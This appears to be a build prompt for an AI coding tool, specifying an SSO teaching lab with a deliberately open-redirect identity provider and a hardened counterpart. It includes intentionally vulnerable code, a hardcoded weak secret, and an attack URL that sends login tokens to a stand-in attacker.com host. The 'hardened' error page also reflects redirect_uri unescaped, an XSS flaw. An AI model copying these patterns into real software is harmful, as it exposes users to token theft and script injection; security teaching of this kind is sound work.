# Cursor Prompt: SSO Demo — WorkHub + Mini IdP (Ports 3064–3066)

## Global UI Standard

| Server type | Theme |
|-------------|-------|
| Guide server | Clone `DASHBOARD_HTML` from `demo-attacked/reverse-tabnabbing/attacker-server.js` — `#0a0a0a` bg, `#00ff41` text, `'Courier New'` font. Copy `<style>` verbatim. |
| SP / IdP servers | Realistic product UI matching their brand |

**Guide pages:** Copy `<style>` verbatim. `padding: 2rem` body. No `max-width` wrapper. Fixed bottom-left `target-switcher` navigation only.
- **After** the verbatim `<style>` block, always add this override: `.flow-box { max-width: 900px; }`

---

## Context

**Concept:** Single Sign-On (SSO)  
**App names:**
- Service Provider: WorkHub — a project dashboard ("Your team's command center")
- Identity Provider (IdP): CorpID — a mini company identity server ("One identity, everywhere")
**Folder:** `auth-concepts/sso/`

SSO means one central login (the Identity Provider) lets users access multiple applications (Service Providers) without re-entering credentials. The vulnerable version has an open redirect — the IdP trusts any `redirect_uri` passed in the login request, so an attacker can redirect the auth token to their own server. The secure version validates `redirect_uri` against an allowlist.

---

## Port Layout

| Port | Role | App |
|------|------|-----|
| 3064 | Service Provider (WorkHub) + mini Identity Provider (CorpID) | WorkHub + CorpID embedded |
| 3065 | Concept guide | SSO Lab |
| 3066 | Improved: `redirect_uri` allowlist + signed tokens | WorkHub + hardened CorpID |

---

## Code Comment Standard — use throughout all three files

```
// ⚠️ VULNERABILITY: <what is wrong and why it matters>
// ✅ PROTECTED: <what was changed and why it is now safe>
```

No lorem ipsum. All copy must be realistic product language.

---

## Files to create

```
auth-concepts/sso/
├── sso-server.js        # WorkHub + CorpID IdP — unvalidated redirect_uri — port 3064
├── guide-server.js      # SSO Lab                                          — port 3065
├── sso-strong-server.js # WorkHub + CorpID IdP — strict allowlist          — port 3066
├── package.json
└── README.md
```

---

## Architecture Note for Cursor

Ports 3064 and 3066 each run **two logical services on one port** to keep the demo self-contained:
- `/idp/*` routes simulate the Identity Provider (CorpID login page + token endpoint)
- All other routes are the Service Provider (WorkHub dashboard)

This is intentional — it avoids requiring students to run 4 servers for one demo.

---

## Port 3064 — WorkHub + Vulnerable CorpID IdP

### File: `sso/sso-server.js`

**Dependencies:** `express ^4.18.2`, `cors ^2.8.5`, `jsonwebtoken ^9.0.2`

```js
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// IdP signing secret
const IDP_SECRET = 'idp-secret';

// ⚠️ VULNERABLE: No redirect_uri allowlist — any URL is accepted
// Service Providers registered with IdP
const REGISTERED_SPS = {
  'workhub': { name: 'WorkHub', clientId: 'workhub-client-id' }
};

// IdP user store
const IDP_USERS = [
  { id: 1, username: 'alice@corp.com', password: 'pass1234', name: 'Alice Chen',    role: 'employee' },
  { id: 2, username: 'bob@corp.com',   password: 'qwerty123',  name: 'Bob Martinez',  role: 'employee' },
  { id: 3, username: 'admin@corp.com', password: 'admin456',   name: 'Admin User',    role: 'admin' },
];
```

### IdP routes (`/idp/*`)

```js
// GET /idp/login?client_id=workhub-client-id&redirect_uri=http://...&state=random
// ⚠️ VULNERABLE: redirect_uri is NOT validated — any URL accepted
app.get('/idp/login', (req, res) => {
  const { client_id, redirect_uri, state } = req.query;
  const sp = Object.values(REGISTERED_SPS).find(s => s.clientId === client_id);

  res.send(IDP_LOGIN_HTML({
    clientName: sp ? sp.name : client_id,
    redirectUri: redirect_uri, // ⚠️ Passed through without validation
    state,
    warning: '⚠ redirect_uri is NOT validated — attacker can set it to any server'
  }));
});

// POST /idp/authenticate
app.post('/idp/authenticate', (req, res) => {
  const { username, password, redirect_uri, state } = req.body;
  const user = IDP_USERS.find(u => u.username === username && u.password === password);

  if (!user) {
    return res.redirect(`/idp/login?error=Invalid+credentials&redirect_uri=${encodeURIComponent(redirect_uri)}&state=${state}`);
  }

  // Issue a short-lived assertion token
  const assertionToken = jwt.sign(
    { sub: user.id, email: user.username, name: user.name, role: user.role, type: 'sso_assertion' },
    IDP_SECRET,
    { expiresIn: '2m', algorithm: 'HS256' }
  );

  // ⚠️ VULNERABLE: redirect to whatever redirect_uri was provided — no allowlist check
  const redirectUrl = `${redirect_uri}?token=${assertionToken}&state=${encodeURIComponent(state || '')}`;
  console.log(`[IdP] Redirecting to: ${redirectUrl}`);
  res.redirect(redirectUrl);
});
```

### SP routes (WorkHub)

```js
// GET / → redirect to IdP if not logged in
app.get('/', (req, res) => {
  const session = sessions.get(req.cookies?.wh_session);
  if (session) return res.redirect('/dashboard');
  const state = crypto.randomBytes(16).toString('hex');
  // ⚠️ redirect_uri is our callback — but IdP won't verify it
  const loginUrl = `/idp/login?client_id=workhub-client-id&redirect_uri=http://localhost:3064/callback&state=${state}`;
  res.redirect(loginUrl);
});

// GET /callback?token=...&state=...
// ⚠️ VULNERABLE: In the ATTACK scenario, redirect_uri pointed elsewhere — this callback never fires
app.get('/callback', (req, res) => {
  const { token, state } = req.query;
  try {
    const payload = jwt.verify(token, IDP_SECRET, { algorithms: ['HS256'] });
    if (payload.type !== 'sso_assertion') return res.status(400).send('Invalid token type');

    const sid = crypto.randomBytes(32).toString('hex');
    sessions.set(sid, { email: payload.email, name: payload.name, role: payload.role });
    res.setHeader('Set-Cookie', `wh_session=${sid}; Path=/; SameSite=Lax; HttpOnly`);
    res.redirect('/dashboard');
  } catch(err) {
    res.status(401).send('SSO callback failed: ' + err.message);
  }
});
```

### Dashboard route — SSR with session data

Add the `/dashboard` route explicitly. **Use SSR** — embed the session data (name, email, role) directly into the HTML response. Do NOT use a static template with a client-side `/api/me` call. The user just completed a complex redirect flow; show their data immediately.

```js
app.get('/dashboard', (req, res) => {
  const raw = req.headers.cookie || '';
  const match = raw.match(/(?:^|;\s*)wh_session=([^;]+)/);
  const sid = match ? match[1] : null;
  const session = sid ? sessions.get(sid) : null;
  if (!session) return res.redirect('/');
  res.send(DASHBOARD_HTML(session)); // SSR: pass session { email, name, role } to template function
});
```

`DASHBOARD_HTML` is a **function** that accepts the session object and returns an HTML string with the user's name and role embedded. Not a string constant.

### UI design

**CorpID IdP login page** (`IDP_LOGIN_HTML`): Clean enterprise login. Colors: `#1e1e2e` bg, `#cdd6f4` text, `#89b4fa` accent (Catppuccin Mocha palette). Center-aligned card, "CorpID" header, tagline "Authenticating for: {clientName}". Show `redirect_uri` value prominently in amber if potentially vulnerable.

**WorkHub SP dashboard** (`DASHBOARD_HTML(session)`): SSR function. Colors: `#ffffff` bg, `#111827` text, `#6366f1` accent (indigo). Sidebar with WorkHub logo, project list, user badge in top-right showing `session.name` and `session.email` from SSO. Include a "Signed in via CorpID SSO" badge.

**Amber banner on IdP login page:**
```
⚠ VULNERABLE: redirect_uri is not validated.
Attack: /idp/login?client_id=workhub-client-id&redirect_uri=http://attacker.com/steal&state=x
→ Victim logs in → assertion token sent to attacker.com instead of WorkHub
```

**Logout (SP-side):** WorkHub implements SP logout only — it deletes the local session. The IdP session remains active (user stays logged in to CorpID), so clicking "Sign in with CorpID" again will succeed without a password prompt. This demonstrates a key SSO property: SP logout ≠ global logout.

```js
// GET /logout — deletes WorkHub SP session, redirects to login
app.get('/logout', (req, res) => {
  const raw = req.headers.cookie || '';
  const match = raw.match(/(?:^|;\s*)wh_session=([^;]+)/);
  const sid = match ? match[1] : null;
  if (sid) sessions.delete(sid);
  res.setHeader('Set-Cookie', 'wh_session=; Path=/; Max-Age=0');
  res.redirect('/?logged_out=1');
});
```

Show a note on the IdP login page when `?logged_out=1` is in the URL:
```
ℹ You signed out of WorkHub. Your CorpID session may still be active —
  clicking sign-in again will log you in immediately without a password.
```

**"Sign Out" button** in WorkHub dashboard top-right, links to `GET /logout`.

Sessions store: `const sessions = new Map();`

---

## Port 3065 — SSO Concept Guide

### File: `sso/guide-server.js`

Copy `<style>` from `DASHBOARD_HTML` verbatim.

**Title:** `🔑 Single Sign-On (SSO) — How It Works`

**Section 1 — SSO Flow** (`.flow-box`)

Heading: `SSO Authentication Flow`

```
ACTORS:
  User         — wants to access WorkHub
  WorkHub (SP) — Service Provider at localhost:3064
  CorpID (IdP) — Identity Provider at localhost:3064/idp/*

1. User visits WorkHub (SP)
   User                    WorkHub (SP)               CorpID (IdP)
     │                          │                          │
     ├── GET / ────────────────→│                          │
     │                          │ No session found         │
     │                          ├── Redirect to IdP ──────→│
     │←── 302 /idp/login ───────┤  ?client_id=workhub     │
     │    ?redirect_uri=.../callback                       │
     │    &state=abc123                                    │

2. User logs in at CorpID IdP
     ├── GET /idp/login ────────────────────────────────→ │
     │                                                     │ Show CorpID login form
     │←── 200 + login form ──────────────────────────────┤
     │
     ├── POST /idp/authenticate { username, password } ─→ │
     │                                                     │ Validate credentials
     │                                                     │ Issue assertion token (JWT, 2 min)
     │←── 302 /callback?token=eyJ...&state=abc123 ────────┤

3. WorkHub receives assertion
     ├── GET /callback?token=eyJ...&state=abc123 ────────→│
     │                                                     │ Verify JWT signature
     │                                                     │ Create WorkHub session
     │←── 302 /dashboard + Set-Cookie: wh_session ────────┤
```

**Section 2 — The Open Redirect Attack** (`.flow-box`)

Heading: `⚠ Attack: Unvalidated redirect_uri`

```
If the IdP does NOT validate redirect_uri:

  Attacker crafts a link:
  http://localhost:3064/idp/login
    ?client_id=workhub-client-id
    &redirect_uri=http://attacker.com/steal   ← ATTACKER'S server
    &state=anyvalue

  Victim clicks the link → sees legitimate CorpID login page → enters credentials

  CorpID issues assertion token and redirects to:
    http://attacker.com/steal?token=eyJhbGciOiJIUzI1NiJ9...

  Attacker receives the assertion token and calls:
    http://localhost:3064/callback?token=<stolen>&state=anyvalue

  Attacker is now logged in as the victim on WorkHub.
```

**Section 3 — The Fix: redirect_uri Allowlist** (`.flow-box`)

Heading: `✅ Fix: Validate redirect_uri Before Redirecting`

```js
// Registered Service Providers with their allowed redirect URIs
const ALLOWED_REDIRECT_URIS = {
  'workhub-client-id': [
    'http://localhost:3064/callback',
    'https://workhub.corp.com/callback'
  ],
  'helpdesk-client-id': [
    'http://localhost:3070/callback'
  ]
};

app.post('/idp/authenticate', (req, res) => {
  const { client_id, redirect_uri } = req.body;
  const allowed = ALLOWED_REDIRECT_URIS[client_id] || [];

  // ✅ Exact match only — no prefix matching, no wildcard
  if (!allowed.includes(redirect_uri)) {
    return res.status(400).json({
      error: 'redirect_uri not allowed',
      provided: redirect_uri,
      allowed: allowed
    });
  }
  // ... proceed with authentication
});
```

```
Rules for redirect_uri validation:
  ✅ Exact string match only — no prefix matching
  ✅ No wildcard subdomains (attacker.evil.workhub.com would match *.workhub.com)
  ✅ Registered at client registration time — not dynamic
  ✅ Log rejected redirect_uris as security events
```

**Section 4 — SP vs IdP** (`.flow-box`)

Heading: `Service Provider vs Identity Provider`

```html
<table style="width:100%;border-collapse:collapse;font-size:0.82rem">
  <tr style="color:#64748b;border-bottom:1px solid #1a3a1a">
    <th style="text-align:left;padding:0.5rem">Role</th>
    <th>Service Provider (SP)</th>
    <th>Identity Provider (IdP)</th>
  </tr>
  <tr style="border-bottom:1px solid #0d1f0d">
    <td style="padding:0.5rem;color:#94a3b8">What it is</td>
    <td style="padding:0.5rem;color:#94a3b8">The app the user wants to use</td>
    <td style="padding:0.5rem;color:#94a3b8">The central login service</td>
  </tr>
  <tr style="border-bottom:1px solid #0d1f0d">
    <td style="padding:0.5rem;color:#94a3b8">Stores credentials?</td>
    <td style="padding:0.5rem;color:#4ade80">No</td>
    <td style="padding:0.5rem;color:#4ade80">Yes (usernames, passwords, MFA)</td>
  </tr>
  <tr style="border-bottom:1px solid #0d1f0d">
    <td style="padding:0.5rem;color:#94a3b8">Examples</td>
    <td style="padding:0.5rem;color:#94a3b8">Slack, GitHub, Salesforce, WorkHub</td>
    <td style="padding:0.5rem;color:#94a3b8">Okta, Azure AD, Google, CorpID</td>
  </tr>
  <tr>
    <td style="padding:0.5rem;color:#94a3b8">Protocols</td>
    <td colspan="2" style="padding:0.5rem;color:#94a3b8">SAML 2.0 (enterprise), OpenID Connect (modern), CAS (legacy)</td>
  </tr>
</table>
```

**Section 5 — Live Allowlist Tester** (`.flow-box`)

Heading: `Test redirect_uri Validation`

Input field: "Enter a redirect_uri to test against the hardened IdP at :3066"
Button: "Test"
Calls `GET http://localhost:3066/idp/validate-redirect?client_id=workhub-client-id&redirect_uri=<input>`
Shows `✅ Allowed` or `✗ Rejected` with reason.

```js
document.getElementById('btn-test-redirect').addEventListener('click', async function() {
  var uri = document.getElementById('redirect-test-input').value.trim();
  var res = await fetch('http://localhost:3066/idp/validate-redirect?client_id=workhub-client-id&redirect_uri=' + encodeURIComponent(uri));
  var data = await res.json();
  showResult('redirect-result', data.allowed ? 'success' : 'failure',
    data.allowed ? '✅ Allowed: ' + uri : '✗ Rejected: ' + data.reason);
});
```

**Helper CSS (append inside `<style>` after the verbatim block):**

```css
/* Override default flow-box width from copied style */
.flow-box { max-width: 900px; }

.decoded-box {
  background: #0a0a0a; border: 1px solid #1a3a1a; border-radius: 4px;
  padding: 0.75rem; font-size: 0.78rem; color: #cbd5e1;
  white-space: pre-wrap; word-break: break-all; min-height: 60px; margin-top: 0.5rem;
}
.result-banner {
  padding: 0.6rem 1rem; border-radius: 4px; font-size: 0.82rem;
  margin-top: 0.75rem; display: none;
}
.result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
.result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
.result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
input.field {
  background: #111; border: 1px solid #1a3a1a; color: #00ff41;
  font-family: 'Courier New', Courier, monospace; font-size: 0.82rem;
  padding: 0.4rem 0.6rem; border-radius: 4px;
}
```

**`showResult` helper + full guide interactive JS:**

```js
function showResult(id, type, msg) {
  var el = document.getElementById(id);
  el.className = 'result-banner ' + type;
  el.textContent = msg;
  el.style.display = 'block';
}

// Section 5 — Live Allowlist Tester
// HTML needed:
// <input class="field" id="redirect-test-input" style="flex:1" placeholder="e.g. http://localhost:3064/callback">
// <button class="demo-btn" id="btn-test-redirect">Test</button>
// <div class="result-banner" id="redirect-result"></div>
// <pre class="decoded-box" id="redirect-out" style="min-height:60px">–</pre>

document.getElementById('btn-test-redirect').addEventListener('click', async function() {
  var uri = document.getElementById('redirect-test-input').value.trim();
  if (!uri) {
    showResult('redirect-result', 'failure', '✗ Enter a redirect_uri to test');
    return;
  }
  try {
    var url = 'http://localhost:3066/idp/validate-redirect?client_id=workhub-client-id&redirect_uri=' + encodeURIComponent(uri);
    var res = await fetch(url);
    var data = await res.json();
    document.getElementById('redirect-out').textContent = JSON.stringify(data, null, 2);
    showResult('redirect-result', data.allowed ? 'success' : 'failure',
      data.allowed
        ? '✅ Allowed: "' + uri + '" is in the registered allowlist for workhub-client-id'
        : '✗ Rejected: "' + uri + '" — ' + data.reason
    );
  } catch(e) {
    showResult('redirect-result', 'failure', '✗ ' + e.message + ' — is port 3066 running?');
  }
});

// Auto-populate common test values as quick-insert buttons
var testUris = [
  'http://localhost:3066/callback',    // ✅ registered
  'http://localhost:3064/callback',    // ✅ registered (cross-demo)
  'http://attacker.com/steal',         // ✗ not registered
  'http://localhost:3066/callback?x=1' // ✗ exact match only
];
// Render these as small chip buttons that pre-fill the input field
```

**HTML for Section 5:**

```html
<div class="flow-box">
  <strong>Test redirect_uri Validation (against hardened port 3066)</strong>
  <div style="display:flex;gap:0.5rem;flex-wrap:wrap;margin:0.5rem 0">
    <span style="font-size:0.78rem;color:#64748b">Quick test:</span>
    <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
      onclick="document.getElementById('redirect-test-input').value='http://localhost:3066/callback'">
      :3066/callback (registered ✅)
    </button>
    <button class="demo-btn" style="font-size:0.75rem;padding:0.2rem 0.5rem"
      onclick="document.getElementById('redirect-test-input').value='http://attacker.com/steal'">
      attacker.com (not registered ✗)
    </button>
  </div>
  <div style="display:flex;gap:0.5rem;align-items:center;flex-wrap:wrap;margin-bottom:0.75rem">
    <input class="field" id="redirect-test-input" style="flex:1"
      placeholder="http://localhost:3064/callback">
    <button class="demo-btn" id="btn-test-redirect">Test</button>
  </div>
  <div class="result-banner" id="redirect-result"></div>
  <pre class="decoded-box" id="redirect-out" style="min-height:60px">–</pre>
</div>
```

**Navigation:**
- `Vulnerable SSO (3064)` → `window.open('http://localhost:3064')`
- `Hardened SSO (3066)` → `window.open('http://localhost:3066')`

---

## Port 3066 — WorkHub + Hardened CorpID IdP

### File: `sso/sso-strong-server.js`

Same as port 3064 including the SSR `/dashboard` route (`DASHBOARD_HTML(session)` function). Key differences:

**Strong secret + allowlist:**
```js
const crypto = require('crypto');
const IDP_SECRET = crypto.randomBytes(64).toString('hex');

// ✅ Explicit allowlist — exact match only
const ALLOWED_REDIRECT_URIS = {
  'workhub-client-id': [
    'http://localhost:3066/callback',
    'http://localhost:3064/callback' // allow for cross-demo testing
  ]
};
```

**Validate before authenticating:**
```js
app.get('/idp/login', (req, res) => {
  const { client_id, redirect_uri, state } = req.query;
  const allowed = ALLOWED_REDIRECT_URIS[client_id] || [];

  // ✅ Reject unknown redirect_uri at display time
  if (!allowed.includes(redirect_uri)) {
    return res.status(400).send(
      '<h1>Invalid redirect_uri</h1><p>' + redirect_uri + ' is not registered for ' + client_id + '</p>'
    );
  }

  res.send(IDP_LOGIN_HTML({ clientName: 'WorkHub', redirectUri: redirect_uri, state, warning: null }));
});

app.post('/idp/authenticate', (req, res) => {
  const { client_id, redirect_uri } = req.body;
  const allowed = ALLOWED_REDIRECT_URIS[client_id] || [];

  if (!allowed.includes(redirect_uri)) {
    return res.status(400).json({ error: 'redirect_uri not in allowlist', provided: redirect_uri });
  }
  // ... rest of authentication
});
```

**Validation endpoint for guide:**
```js
app.get('/idp/validate-redirect', (req, res) => {
  const { client_id, redirect_uri } = req.query;
  const allowed = ALLOWED_REDIRECT_URIS[client_id] || [];
  res.json({
    allowed: allowed.includes(redirect_uri),
    reason: allowed.includes(redirect_uri) ? 'Exact match found' : 'Not in registered allowlist for ' + client_id,
    allowedUris: allowed
  });
});
```

**Green banner:**
```
✅ HARDENED: redirect_uri validated against exact allowlist before authentication.
Attacker's redirect_uri → 400 Bad Request.
```

---

## Shared `package.json` at `sso/`

```json
{
  "name": "sso-demo",
  "version": "1.0.0",
  "scripts": {
    "vulnerable": "node sso-server.js",
    "guide":      "node guide-server.js",
    "strong":     "node sso-strong-server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "cors": "^2.8.5",
    "jsonwebtoken": "^9.0.2"
  }
}
```

---

## README at `sso/README.md`

### SSO Flow

```
User → WorkHub (SP) → redirect to CorpID (IdP) → login → assertion token
     ← redirect back to WorkHub /callback?token=... → WorkHub creates session
```

### Vulnerability (port 3064)

IdP accepts any `redirect_uri`. Attack: craft login URL with `redirect_uri=http://attacker.com/steal` → token sent to attacker.

### Fix (port 3066)

`redirect_uri` must be an exact match in the registered allowlist for the `client_id`. Rejection at both `/idp/login` (display) and `/idp/authenticate` (POST).

### Run the demo

```bash
cd auth-concepts/sso
npm install
npm run vulnerable  # terminal 1 → localhost:3064
npm run guide       # terminal 2 → localhost:3065
npm run strong      # terminal 3 → localhost:3066
```

---

## Key technical notes for Cursor

1. **Both ports 3064 and 3066 serve two logical services on one port.** Routes prefixed with `/idp/` are the Identity Provider; all other routes are the Service Provider (WorkHub). This is intentional — it avoids running 4 servers for one demo. Comments in the file should clearly mark which routes belong to which "service".

2. **Sessions on the SP side use a cookie, not localStorage.** WorkHub's `/callback` handler sets `Set-Cookie: wh_session=<token>; Path=/; HttpOnly; SameSite=Lax`. The SP session Map is separate from the IdP auth codes. The cookie parser pattern from session.md applies here too.

3. **`fetch` is not built into older Node.js.** If targeting Node.js <18, the `/callback` handler that exchanges the assertion token will need `node-fetch` or `http.request`. For Node.js 18+ `fetch` is available natively. Add a comment: `// Node.js 18+ built-in fetch used here. If on older Node, run: npm install node-fetch`.

4. **The open redirect attack requires the user to visit a crafted URL.** In the demo, the attack is demonstrated by having the user manually paste the attack URL into their browser: `http://localhost:3064/idp/login?client_id=workhub-client-id&redirect_uri=http://attacker.com/steal&state=x`. There is no actual attacker server in this demo — instead, the guide explains what would happen.

5. **`/idp/validate-redirect` on port 3066 must allow CORS from port 3065.** The guide's live tester makes a cross-origin GET to this endpoint. Add `cors({ origin: 'http://localhost:3065' })` to sso-strong-server.js.

6. **State parameter.** The SSO demo generates a `state` on the SP side and echoes it back via the IdP. Port 3064 does not validate it (the open redirect vulnerability is more fundamental). Port 3066 should generate and validate state — add a `pendingStates` Set and verify on `/callback`. This previews the OAuth2 state concept in the next demo.
